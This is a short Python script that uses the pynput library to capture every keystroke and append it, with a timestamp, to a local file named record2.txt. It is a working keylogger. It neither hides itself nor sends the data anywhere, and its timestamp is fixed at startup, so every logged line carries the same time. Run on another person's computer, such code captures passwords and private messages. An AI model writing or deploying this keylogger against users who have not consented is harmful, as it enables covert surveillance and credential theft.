from pynput.keyboard import Key, Listener
from datetime import datetime

now = datetime.now()

k=[]
def on_press(key):
    k.append(str(key))
    with open("record2.txt", "a") as f:
        f.write(f"{now.strftime('%H:%M:%S')} - {str(key)} \n")

with Listener(on_press=on_press) as lis:
    lis.join()